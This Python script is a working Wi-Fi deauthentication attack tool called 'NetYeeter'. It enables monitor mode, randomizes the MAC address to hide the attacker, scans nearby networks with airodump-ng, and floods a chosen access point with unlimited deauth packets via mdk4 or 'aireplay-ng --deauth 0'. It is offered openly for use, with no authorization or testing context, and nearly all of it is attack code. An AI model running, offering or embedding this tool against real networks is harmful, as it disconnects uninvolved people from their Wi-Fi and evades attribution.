"""
************************************************
*           NetYeeter Wi-Fi Deauth Tool        *
*                    by 707                    *
*            https://github.com/707io          *
*----------------------------------------------*
*         Wi-Fi? More like Bye-Fi! 💀          *
************************************************
"""


import os
import time
import subprocess
import sys
import random
import threading
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table
from rich.style import Style

console = Console()
LOG_FILE = "attack_log.txt"
SCAN_FOLDER = "scanned_networks"
LOGS_FOLDER = "logs"
MAC_CHANGE_INTERVAL = 3  # Change MAC address every 3 seconds

def check_root():
    """Check if the script is run as root."""
    if os.geteuid() != 0:
        console.print("[bold red][!] This script must be run as root! Use sudo python3 netyeeter.py.")
        sys.exit(1)

def show_banner():
    """Display the script banner."""
    os.system("clear")
    banner = """
      ███╗   ██╗███████╗████████╗██╗   ██╗███████╗███████╗████████╗███████╗██████╗
      ████╗  ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
      ██╔██╗ ██║█████╗     ██║    ╚████╔╝ █████╗  █████╗     ██║   █████╗  ██████╔╝
      ██║╚██╗██║██╔══╝     ██║     ╚██╔╝  ██╔══╝  ██╔══╝     ██║   ██╔══╝  ██╔══██╗
      ██║ ╚████║███████╗   ██║      ██║   ███████╗███████╗   ██║   ███████╗██║  ██║
      ╚═╝  ╚═══╝╚══════╝   ╚═╝      ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
       Wi-Fi? More like Bye-Fi! 💀 | Created by 707 (https://github.com/707io)
    """
    console.print(f"[bold cyan]{banner}[/bold cyan]")


def check_dependencies():
    """Check if required tools are installed."""
    required_tools = ["aircrack-ng", "iw", "mdk3", "mdk4", "macchanger"]
    missing_tools = []
    for tool in required_tools:
        if not subprocess.run(["which", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
            missing_tools.append(tool)
    if missing_tools:
        console.print(f"[bold red][!] Missing tools: {', '.join(missing_tools)}")
        install = Prompt.ask("[bold yellow][?] Do you want to install them now? (yes/no)", choices=["yes", "no"])
        if install == "yes":
            for tool in missing_tools:
                console.print(f"[bold cyan][+] Installing {tool}...")
                subprocess.run(["sudo", "apt-get", "install", "-y", tool], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            console.print("[bold red][!] Exiting. Required tools are missing.")
            sys.exit(1)

def cleanup(monitor_interface, original_interface):
    """Clean up and restore the original interface settings."""
    console.print("[bold red][!] Cleaning up...")
    os.system("pkill airodump-ng")
    os.system("pkill aireplay-ng")
    os.system("pkill mdk3")
    os.system("pkill mdk4")
    os.system(f"airmon-ng stop {monitor_interface}")
    os.system("service NetworkManager restart")
    os.system("service wpa_supplicant restart")

    # Delete the scanned_networks folder if it exists
    if os.path.exists(SCAN_FOLDER):
        os.system(f"rm -rf {SCAN_FOLDER}")

    console.print("[bold green][+] Managed mode restored and cleanup complete.")

def enable_monitor_mode(interface):
    """Enable monitor mode on the specified interface."""
    console.print(f"[bold cyan][+] Killing interfering processes...")
    os.system("airmon-ng check kill")
    os.system("service NetworkManager stop")
    console.print(f"[bold cyan][+] Enabling Monitor Mode on {interface}...")
    os.system(f"airmon-ng start {interface}")
    time.sleep(2)
    monitor_interface = os.popen("iw dev | awk '$1==\"Interface\"{print $2}'").read().strip()
    if not monitor_interface:
        console.print("[bold red][!] Failed to enable monitor mode. Exiting.")
        sys.exit(1)
    console.print(f"[bold green][+] {monitor_interface} is now in monitor mode.")
    return monitor_interface

def randomize_mac(interface):
    """Randomize the MAC address of the interface using locally administered addresses."""
    new_mac = "02:" + ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(5)])
    console.print(f"[bold cyan][+] Changing MAC address of {interface} to {new_mac}...")
    os.system(f"ifconfig {interface} down")
    os.system(f"macchanger -m {new_mac} {interface}")
    os.system(f"ifconfig {interface} up")

def scan_networks(interface):
    """Scan for available networks in real-time."""
    if not os.path.exists(SCAN_FOLDER):
        os.makedirs(SCAN_FOLDER)
    console.print("[bold green][+] Scanning networks in real-time... (CTRL+C to stop)")
    process = subprocess.Popen(["airodump-ng", interface, "--write", f"{SCAN_FOLDER}/scan", "--output-format", "csv"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        while True:
            csv_file = next((file for file in os.listdir(SCAN_FOLDER) if file.startswith("scan") and file.endswith(".csv")), None)
            if csv_file:
                networks, clients = parse_networks(os.path.join(SCAN_FOLDER, csv_file))
                os.system("clear")
                display_networks(networks)
                console.print("\nPress CTRL+C to stop scanning.")
            time.sleep(3)  # Refresh every 3 seconds
    except KeyboardInterrupt:
        process.terminate()
        os.system("pkill airodump-ng")
        console.print("[bold yellow][!] Stopping scan...")
        return networks, clients

def parse_networks(csv_file):
    """Parse the CSV file to extract network and client information."""
    networks = []
    clients = []
    try:
        with open(csv_file, "r", encoding="utf-8", errors="ignore") as file:
            lines = file.readlines()
            for line in lines:
                fields = line.split(",")
                if len(fields) > 13 and "Station MAC" not in fields[0]:
                    ssid = fields[13].strip()
                    if not ssid:
                        ssid = "<Hidden SSID>"
                    mac = fields[0].strip()
                    channel = fields[3].strip()
                    power = fields[8].strip()
                    try:
                        power = int(power)  # Convert power to integer
                    except ValueError:
                        power = -100  # Default value if power is not a valid integer
                    encryption = fields[5].strip()
                    wps = "no" if "WPA" in encryption else "yes"
                    pmf = "yes" if "PMF" in encryption else "no"
                    if ssid and mac not in [n[1] for n in networks]:
                        networks.append((ssid, mac, channel, power, encryption, wps, pmf))
                elif len(fields) > 5 and "Station MAC" in fields[0]:
                    client_mac = fields[0].strip()
                    network_mac = fields[5].strip()
                    clients.append((client_mac, network_mac))
    except Exception as e:
        console.print(f"[bold red][!] Error parsing CSV file: {e}")
    return networks, clients

def display_networks(networks):
    """Display the list of networks in a table with color-coded signal strength."""
    table = Table(title="Available Networks")
    table.add_column("#", style="cyan", justify="center")
    table.add_column("SSID", style="magenta")
    table.add_column("MAC Address", style="yellow")
    table.add_column("Channel", style="green", justify="center")
    table.add_column("Power", style="red", justify="center")
    table.add_column("Encryption", style="blue")
    table.add_column("WPS", style="white", justify="center")
    table.add_column("PMF", style="white", justify="center")
    for i, net in enumerate(networks, 1):
        power = net[3]
        if power >= -50:
            power_style = Style(color="green", bold=True)
        elif -70 <= power < -50:
            power_style = Style(color="yellow", bold=True)
        else:
            power_style = Style(color="red", bold=True)
        table.add_row(str(i), net[0], net[1], net[2], f"[{power_style}]{net[3]}[/]", net[4], net[5], net[6])
    console.print(table)

def select_interface():
    """Select the network interface to use."""
    interfaces = os.popen("iw dev | grep Interface | awk '{print $2}'").read().split()
    if not interfaces:
        console.print("[bold red][!] No interfaces found. Exiting.")
        sys.exit(1)
    console.print("\n[bold cyan]Available Interfaces:")
    for i, iface in enumerate(interfaces, 1):
        console.print(f"{i}. {iface}")
    selected = int(Prompt.ask("[bold yellow][?] Choose interface (number)", choices=[str(i) for i in range(1, len(interfaces) + 1)]))
    return interfaces[selected - 1]

def select_network(networks):
    """Prompt the user to select a single network to attack."""
    if not networks:
        console.print("[bold red][!] No networks found.")
        return None
    console.print("[bold yellow][?] Select a network to attack (number)")
    selected = int(Prompt.ask("[bold yellow][?] Choose network (number)", choices=[str(i) for i in range(1, len(networks) + 1)]))
    return networks[selected - 1]

def select_deauth_tool():
    """Prompt the user to select the deauthentication tool."""
    console.print("[bold cyan]Select Deauthentication Tool:")
    console.print("1. mdk4 (Recommended)")
    console.print("2. aireplay-ng (Fallback)")
    choice = int(Prompt.ask("[bold yellow][?] Choose tool (1 or 2)", choices=["1", "2"]))
    return "mdk4" if choice == 1 else "aireplay-ng"

def deauth_network(interface, target_bssid, channel, deauth_tool):
    """Perform a deauthentication attack on the selected network."""
    console.print(f"[bold cyan][+] Switching to channel {channel}...")
    os.system(f"iwconfig {interface} channel {channel}")
    console.print(f"[bold cyan][+] Starting {deauth_tool} attack on {target_bssid}...")
    console.print(f"[bold yellow][!] Press CTRL+C to stop the attack.")
    try:
        if deauth_tool == "mdk4":
            process = subprocess.Popen(["mdk4", interface, "d", "-c", channel, "-B", target_bssid])
        else:
            process = subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", target_bssid, interface])
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        console.print("[bold yellow][!] Stopping attack...")
    finally:
        process.terminate()

def main():
    """Main function to run the script."""
    check_root()
    check_dependencies()
    monitor_interface = None
    original_interface = None
    try:
        show_banner()
        original_interface = select_interface()
        monitor_interface = enable_monitor_mode(original_interface)
        while True:
            randomize_mac(monitor_interface)
            networks, clients = scan_networks(monitor_interface)
            if networks:
                selected_network = select_network(networks)
                if selected_network:
                    deauth_tool = select_deauth_tool()
                    deauth_network(monitor_interface, selected_network[1], selected_network[2], deauth_tool)
                    restart = Prompt.ask("[bold yellow][?] Do you want to attack again? (yes/no)", choices=["yes", "no"])
                    if restart == "no":
                        break
                else:
                    console.print("[bold yellow][!] No network selected. Exiting...")
                    break
            else:
                console.print("[bold yellow][!] No networks found. Exiting...")
                break
    except Exception as e:
        console.print(f"[bold red][!] An error occurred: {e}")
    finally:
        if monitor_interface and original_interface:
            cleanup(monitor_interface, original_interface)

if __name__ == "__main__":

    main()


